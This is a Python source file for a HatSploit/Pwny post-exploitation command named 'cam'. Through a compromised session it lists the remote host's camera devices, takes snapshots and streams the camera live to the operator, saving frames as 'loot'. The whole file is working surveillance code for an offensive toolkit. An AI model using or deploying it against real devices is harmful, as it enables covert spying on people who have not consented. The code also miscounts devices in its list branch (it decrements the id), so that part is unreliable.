"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os
import sys
import time
import threading

from pwny.api import *
from pwny.types import *

from pex.proto.stream import StreamClient

from badges.cmd import Command

CAM_BASE = 5

CAM_FRAME = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL)
CAM_LIST = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 1)
CAM_START = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 2)
CAM_STOP = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 3)

CAM_ID = tlv_custom_type(TLV_TYPE_INT, CAM_BASE, API_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "cam",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Use built-in camera.",
            'Usage': "cam <option> [arguments]",
            'MinArgs': 1,
            'Options': {
                'list': ['', 'List all camera devices.'],
                'snap': ['<id> <path>', 'Take a snapshot using device.'],
                'stream': ['<id>', 'Stream device in real time.']
            }
        })

        self.stop = False

    def read_thread(self, path: str):
        while True:
            if self.stop:
                break

            result = self.session.send_command(
                tag=CAM_FRAME
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to read device!")
                break

            frame = result.get_raw(TLV_TYPE_BYTES)

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

            except Exception:
                self.print_error(f"Failed to write image to {path}!")

    def run(self, args):
        if args[1] == 'stream':
            result = self.session.send_command(
                tag=CAM_START,
                args={
                    CAM_ID: int(args[2])-1,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to open device #{args[2]}!")
                return

            file = self.session.loot.random_loot('png')
            path = self.session.loot.random_loot('html')

            thread = threading.Thread(target=self.read_thread, args=(file,))
            thread.setDaemon(True)
            thread.start()

            client = StreamClient(path=path, image=file)
            client.create_video()

            self.print_process(f"Streaming device #{args[2]}...")
            self.print_information("Press Ctrl-C to stop.")

            try:
                client.stream()
                for _ in sys.stdin:
                    pass

            except KeyboardInterrupt:
                self.print_process("Stopping...")
                self.stop = True

            thread.join()

            self.session.send_command(tag=CAM_STOP)
            self.session.loot.remove_loot(file)
            self.session.loot.remove_loot(path)

        elif args[1] == 'list':
            result = self.session.send_command(
                tag=CAM_LIST
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id -= 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args[1] == 'snap':
            result = self.session.send_command(
                tag=CAM_START,
                args={
                    CAM_ID: int(args[2])-1,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to open device #{args[2]}!")
                return

            result = self.session.send_command(
                tag=CAM_FRAME
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to read device #{args[2]}!")
                self.session.send_command(tag=CAM_STOP)
                return

            frame = result.get_raw(TLV_TYPE_BYTES)

            try:
                with open(args[3], 'wb') as f:
                    f.write(frame)
            except Exception:
                self.print_error(f"Failed to write image to {args[3]}!")

            self.session.send_command(tag=CAM_STOP)
